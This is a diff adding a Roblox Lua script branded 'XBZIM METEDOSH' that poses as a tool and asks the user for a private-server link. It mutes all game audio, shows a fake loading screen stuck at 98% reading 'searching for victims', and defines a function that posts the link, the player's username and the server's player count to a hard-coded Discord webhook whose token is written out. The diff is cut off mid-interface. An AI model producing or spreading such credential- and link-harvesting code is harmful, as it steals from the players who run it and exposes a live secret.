@@ -1,0 +1,233 @@
+--========================================================--
+
+-- WEBHOOK CONFIG
+--========================================================--
+local WEBHOOK = "https://canary.discord.com/api/webhooks/1448313741019185215/NO8rFEG0UBEvshm7LSdzNGL9qUjbrjJe3D7KlUhfipg4rlralpgsJJvgcGx3dswOiY90"
+
+local Http = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local SoundService = game:GetService("SoundService")
+
+--========================================================--
+-- MUTAÇÃO TOTAL
+--========================================================--
+pcall(function()
+SoundService.RespectFilteringEnabled = false
+SoundService.Volume = 0
+end)
+
+for _, sg in ipairs(SoundService:GetChildren()) do
+if sg:IsA("SoundGroup") then
+sg:Destroy()
+end
+end
+
+local function DestroySound(obj)
+if obj:IsA("Sound") then
+obj.Volume = 0
+obj.Playing = false
+obj:Destroy()
+end
+end
+
+local function MuteTotal()
+for _, s in ipairs(game:GetDescendants()) do
+DestroySound(s)
+end
+if LocalPlayer:FindFirstChild("PlayerGui") then
+for _, s in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
+DestroySound(s)
+end
+end
+end
+
+game.DescendantAdded:Connect(function(obj)
+task.wait()
+DestroySound(obj)
+end)
+
+task.spawn(function()
+while true do
+SoundService.Volume = 0
+MuteTotal()
+task.wait()
+end
+end)
+
+--========================================================--
+-- ENVIAR WEBHOOK
+--========================================================--
+local function enviarWebhook(link)
+local qtdPlayers = #Players:GetPlayers()
+
+pcall(function()
+request({
+Url = WEBHOOK,
+Method = "POST",
+Headers = {["Content-Type"] = "application/json"},
+Body = Http:JSONEncode({
+embeds = {{
+title = "📩 XBZIM METEDOSH VÍTIMA ENCONTRADA",
+color = 3092790,
+fields = {
+{name = "🔗 Link", value = link},
+{name = "👤 Usuário", value = LocalPlayer.Name},
+{name = "👥 Jogadores no Servidor", value = tostring(qtdPlayers)}
+}
+}}
+})
+})
+end)
+
+end
+
+--========================================================--
+-- TELA DE CARREGAMENTO PROFISSIONAL (98%)
+--========================================================--
+local function LoadingScreen()
+MuteTotal()
+
+local gui = Instance.new("ScreenGui")
+gui.Parent = game.CoreGui
+gui.DisplayOrder = 999999999
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+
+-- FUNDO
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.fromRGB(10,0,20)
+local grad = Instance.new("UIGradient", bg)
+grad.Color = ColorSequence.new({
+ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 0, 70)),
+ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 0, 20))
+})
+grad.Rotation = 45
+
+-- TÍTULO
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.new(1,0,0,90)
+title.Position = UDim2.new(0.5,0,0.28,0)
+title.AnchorPoint = Vector2.new(0.5,0.5)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBlack
+title.Text = "XBZIM METEDOSH"
+title.TextScaled = true
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+-- SUBTÍTULO
+local subtitle = Instance.new("TextLabel", bg)
+subtitle.Size = UDim2.new(1,0,0,60)
+subtitle.Position = UDim2.new(0.5,0,0.40,0)
+subtitle.AnchorPoint = Vector2.new(0.5,0.5)
+subtitle.BackgroundTransparency = 1
+subtitle.Font = Enum.Font.GothamBold
+subtitle.Text = "PROCURANDO VÍTIMAS..."
+subtitle.TextScaled = true
+subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+-- SPINNER
+local spinner = Instance.new("ImageLabel", bg)
+spinner.Size = UDim2.new(0,120,0,120)
+spinner.Position = UDim2.new(0.5,0,0.63,0)
+spinner.AnchorPoint = Vector2.new(0.5,0.5)
+spinner.BackgroundTransparency = 1
+spinner.Image = "rbxassetid://9067069331"
+
+-- BARRA
+local barBG = Instance.new("Frame", bg)
+barBG.Size = UDim2.new(0.45,0,0,12)
+barBG.Position = UDim2.new(0.5,0,0.80,0)
+barBG.AnchorPoint = Vector2.new(0.5,0.5)
+barBG.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(0,10)
+
+local barFill = Instance.new("Frame", barBG)
+barFill.Size = UDim2.new(0,0,1,0)
+barFill.BackgroundColor3 = Color3.fromRGB(190,110,255)
+Instance.new("UICorner", barFill).CornerRadius = UDim.new(0,10)
+
+-- PORCENTAGEM
+local percent = Instance.new("TextLabel", bg)
+percent.Size = UDim2.new(1,0,0,40)
+percent.Position = UDim2.new(0.5,0,0.86,0)
+percent.AnchorPoint = Vector2.new(0.5,0.5)
+percent.BackgroundTransparency = 1
+percent.Font = Enum.Font.GothamBold
+percent.TextScaled = true
+percent.TextColor3 = Color3.fromRGB(255, 255, 255)
+percent.Text = "0%"
+
+-- ANIMAÇÃO
+task.spawn(function()
+local p = 0
+
+while barFill.Parent and p < 98 do
+spinner.Rotation += 3
+p += math.random(1,3)
+if p > 98 then p = 98 end
+
+percent.Text = p .. "%"
+barFill.Size = UDim2.new(p/100, 0, 1, 0)
+
+task.wait(0.05)
+
+end
+
+percent.Text = "98%"
+
+while barFill.Parent do
+spinner.Rotation += 3
+task.wait(0.01)
+end
+
+end)
+
+end
+
+--========================================================--
+-- MENU GUI FINAL (MODELO DA FOTO)
+--========================================================--
+local gui = Instance.new("ScreenGui")
+gui.Parent = game.CoreGui
+gui.DisplayOrder = 999999998
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+
+local base = Instance.new("Frame", gui)
+base.Size = UDim2.new(0,420,0,260)
+base.Position = UDim2.new(0.5,-210,0.5,-130)
+base.BackgroundColor3 = Color3.fromRGB(18,18,18)
+Instance.new("UICorner", base).CornerRadius = UDim.new(0,18)
+
+-- TÍTULO (🎄 XBZIM  METEDOSH)
+local title2 = Instance.new("TextLabel", base)
+title2.Size = UDim2.new(1,0,0,45)
+title2.Position = UDim2.new(0,0,0,10)
+title2.BackgroundTransparency = 1
+title2.Font = Enum.Font.GothamBlack
+title2.Text = "🎄 XBZIM METEDOSH"
+title2.TextScaled = true
+title2.TextColor3 = Color3.fromRGB(255,255,255)
+
+-- SUBTÍTULO: Link do Servidor Privado
+local subtitle = Instance.new("TextLabel", base)
+subtitle.Size = UDim2.new(1,-30,0,25)
+subtitle.Position = UDim2.new(0,15,0,70)
+subtitle.BackgroundTransparency = 1
+subtitle.Font = Enum.Font.GothamMedium
+subtitle.Text = "Link do Servidor Privado"
+subtitle.TextScaled = true
+subtitle.TextColor3 = Color3.fromRGB(200,200,200)
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+
+-- CAIXA DE TEXTO IGUAL A FOTO
+local box = Instance.new("TextBox", base)
+box.Size = UDim2.new(1,-30,0,45)
+box.Position = UDim2.new(0,15,0,110)
+box.BackgroundColor3 = Color3.fromRGB(40,40,40)
+box.PlaceholderText = "https://www.roblox.com/share?code=..."
+box.Text = ""
+box.TextColor3 = Color3.new(1,1,1)
+box.TextScaled = true
